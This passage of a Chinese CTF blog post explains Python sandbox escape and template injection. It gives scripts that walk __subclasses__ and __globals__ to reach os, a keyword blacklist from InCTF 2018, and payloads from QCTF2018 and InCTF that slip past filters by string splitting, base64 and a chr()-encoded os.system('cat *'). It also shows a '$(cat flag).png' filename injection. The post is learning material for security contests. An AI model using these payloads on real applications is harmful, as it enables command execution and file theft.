&apos;_frozen_importlib._installed_safely&apos;&gt;</span><br><span class="line">79 &lt;class &apos;_frozen_importlib.ModuleSpec&apos;&gt;</span><br><span class="line">91 &lt;class &apos;_frozen_importlib_external.FileLoader&apos;&gt;</span><br><span class="line">92 &lt;class &apos;_frozen_importlib_external._NamespacePath&apos;&gt;</span><br><span class="line">93 &lt;class &apos;_frozen_importlib_external._NamespaceLoader&apos;&gt;</span><br><span class="line">95 &lt;class &apos;_frozen_importlib_external.FileFinder&apos;&gt;</span><br><span class="line">103 &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;</span><br><span class="line">104 &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;</span><br><span class="line">105 &lt;class &apos;codecs.StreamReaderWriter&apos;&gt;</span><br><span class="line">106 &lt;class &apos;codecs.StreamRecoder&apos;&gt;</span><br><span class="line">128 &lt;class &apos;os._wrap_close&apos;&gt;</span><br><span class="line">129 &lt;class &apos;_sitebuiltins.Quitter&apos;&gt;</span><br><span class="line">130 &lt;class &apos;_sitebuiltins._Printer&apos;&gt;</span><br></pre></td></tr></table></figure>
+<p>进一步寻找该类中的属性</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#exp2.py</span><br><span class="line">keyword=raw_input(&quot;Pleas input the name of the property:&quot;)</span><br><span class="line"></span><br><span class="line">cnt=0</span><br><span class="line">for item in [].__class__.__base__.__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">        if keyword in item.__init__.__globals__:</span><br><span class="line">            print(cnt,item)</span><br><span class="line">        cnt+=1</span><br><span class="line">    except:</span><br><span class="line">        cnt+=1</span><br><span class="line">        continue</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        cnt2=0</span><br><span class="line">        for i in item.__init__.__globals__:</span><br><span class="line">            if keyword in item.__init__.__globals__[i]:</span><br><span class="line">                print(cnt,item,cnt2,i)</span><br><span class="line">            cnt2+=1         </span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="遍历某个类的属性-py3"><a href="#遍历某个类的属性-py3" class="headerlink" title="遍历某个类的属性(py3)"></a>遍历某个类的属性(py3)</h3><p>by DoubleSigma</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># search.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(obj, max_depth)</span>:</span></span><br><span class="line">    </span><br><span class="line">    visited_clss = []</span><br><span class="line">    visited_objs = []</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">(obj, path=<span class="string">'obj'</span>, depth=<span class="number">0</span>)</span>:</span></span><br><span class="line">        <span class="keyword">yield</span> path, obj</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> depth == max_depth:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> isinstance(obj, (int, float, bool, str, bytes)):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> isinstance(obj, type):</span><br><span class="line">            <span class="keyword">if</span> obj <span class="keyword">in</span> visited_clss:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            visited_clss.append(obj)</span><br><span class="line">            <span class="comment">#print(obj)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> obj <span class="keyword">in</span> visited_objs:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            visited_objs.append(obj)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># attributes</span></span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> dir(obj):</span><br><span class="line">            <span class="keyword">if</span> name.startswith(<span class="string">'__'</span>) <span class="keyword">and</span> name.endswith(<span class="string">'__'</span>):</span><br><span class="line">                <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span>  (<span class="string">'__globals__'</span>, <span class="string">'__class__'</span>, <span class="string">'__self__'</span>,</span><br><span class="line">                                 <span class="string">'__weakref__'</span>, <span class="string">'__objclass__'</span>, <span class="string">'__module__'</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            attr = getattr(obj, name)</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> visit(attr, <span class="string">'&#123;&#125;.&#123;&#125;'</span>.format(path, name), depth + <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># dict values</span></span><br><span class="line">        <span class="keyword">if</span> hasattr(obj, <span class="string">'items'</span>) <span class="keyword">and</span> callable(obj.items):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">for</span> k, v <span class="keyword">in</span> obj.items():</span><br><span class="line">                    <span class="keyword">yield</span> <span class="keyword">from</span> visit(v, <span class="string">'&#123;&#125;[&#123;&#125;]'</span>.format(path, repr(k)), depth)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># items</span></span><br><span class="line">        <span class="keyword">elif</span> isinstance(obj, (set, list, tuple, frozenset)):</span><br><span class="line">            <span class="keyword">for</span> i, v <span class="keyword">in</span> enumerate(obj):</span><br><span class="line">                <span class="keyword">yield</span> <span class="keyword">from</span> visit(v, <span class="string">'&#123;&#125;[&#123;&#125;]'</span>.format(path, repr(i)), depth)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">from</span> visit(obj)</span><br></pre></td></tr></table></figure>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import platform</span><br><span class="line"></span><br><span class="line">for path, obj in search(platform, 5):</span><br><span class="line">	if obj == os:</span><br><span class="line">		print(path)</span><br></pre></td></tr></table></figure>
+<h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><h4 id="QCTF2018-Web-Confusion1"><a href="#QCTF2018-Web-Confusion1" class="headerlink" title="QCTF2018    Web Confusion1"></a>QCTF2018    Web Confusion1</h4><p>​    SSTI+py沙箱逃逸</p>
+<p>过滤了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__class__</span><br><span class="line">__subclasses__</span><br></pre></td></tr></table></figure>
+<p>Payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;&#123;&#123;[].__getattribute__(&apos;__cla&apos;+&apos;ss__&apos;).__base__.__getattribute__([].__getattribute__(&apos;__cla&apos;+&apos;ss__&apos;).__base__,&apos;__subclas&apos;+&apos;ses__&apos;)()[40](&apos;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&apos;).__getattribute__(&apos;re&apos;+&apos;ad&apos;)()&#125;&#125;</span><br><span class="line">#如下详见SSTI</span><br><span class="line">&gt;&gt;&gt;&apos;&apos;[request.args.a][request.args.b][2][request.args.c]()[40](&apos;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&apos;)[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read</span><br></pre></td></tr></table></figure>
+<h4 id="InCTF-2018-The-Most-Secure-File-Uploader"><a href="#InCTF-2018-The-Most-Secure-File-Uploader" class="headerlink" title="InCTF 2018 The Most Secure File Uploader"></a>InCTF 2018 The Most Secure File Uploader</h4><p>注释符#断掉末尾</p>
+<p>blacklist:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import|os|class|subclasses|mro|request|args|eval|if|for|\%|subprocess|file|open|popen|builtins|\+|compile|execfile|from_pyfile|config|local|\`|\||\&amp;|\;|\&#123;|\&#125;</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">print(globals().__getitem__(&apos;&apos;.join([&apos;__builtin&apos;,&apos;s__&apos;])).__dict__[&apos;&apos;.join([&apos;op&apos;,&apos;en&apos;])](&apos;flag&apos;).read())#.jpg</span><br><span class="line"></span><br><span class="line">print globals().values()[0].__dict__[&apos;b3Blbg==&apos;.decode(&apos;base64&apos;)](&apos;flag&apos;,&apos;r&apos;).read()#.jpg</span><br><span class="line"></span><br><span class="line">exec(&apos;&apos;.join([chr(105),chr(109),chr(112),chr(111),chr(114),chr(116),chr(32),chr(111),chr(115),chr(59),chr(111),chr(115),chr(46),chr(115),chr(121),chr(115),chr(116),chr(101),chr(109),chr(40),chr(39),chr(99),chr(97),chr(116),chr(32),chr(42),chr(39),chr(41)]))#.png</span><br><span class="line"></span><br><span class="line">#php注入思路</span><br><span class="line">$(cat flag).png</span><br></pre></td></tr></table></figure>
+<h2 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h2><ul>
+<li><a href="http://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/" target="_blank" rel="noopener">Python 沙盒逃逸备忘</a></li>
+<li><a href="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">关于Python-sec的一些总结</a></li>
+<li><a href="http://www.freebuf.com/author/%E5%90%88%E5%A4%A9%E6%99%BA%E6%B1%87" target="_blank" rel="noopener">合天智汇的QCTF的部分wp</a></li>
+</ul>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://ZenisLTZ.github.io/2018/10/10/PySandox/" title="Python沙箱" target="_blank" rel="external">http://ZenisLTZ.github.io/2018/10/10/PySandox/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/ZenisLTZ" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/ZenisLTZ" target="_blank"><span class="text-dark">boris lee</span><small class="ml-1x"></small></a></h3>
+        <div>Web security researcher</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2018/10/09/PhpCodeExcution/" title="PHP Code Excution Notes"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/ZenisLTZ" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/borislee26@gmail.com" target="_blank" title="E-Mail" data-toggle=tooltip data-placement=top><i class="icon icon-E-Mail"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script src="/js/plugin.min.js"></script>
+<script src="/js/application.js"></script>
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
